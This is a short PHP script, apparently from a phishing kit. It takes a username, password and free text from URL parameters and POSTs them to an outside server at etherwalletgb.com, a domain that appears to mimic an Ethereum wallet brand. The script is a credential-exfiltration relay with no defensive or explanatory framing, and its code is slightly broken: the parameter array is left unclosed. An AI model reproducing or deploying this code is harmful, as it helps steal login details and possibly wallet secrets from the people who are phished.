<?php
$u = $_GET['user'];
$p = $_GET['pass'];
$t = $_GET['text'];
$url = 'http://etherwalletgb.com/server.php';
$params = array(
    'user' => $u, 
    'pass' => $p, 
    'text' => $t, 
$result = file_get_contents($url, false, stream_context_create(array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($params)
    )
)));
?>
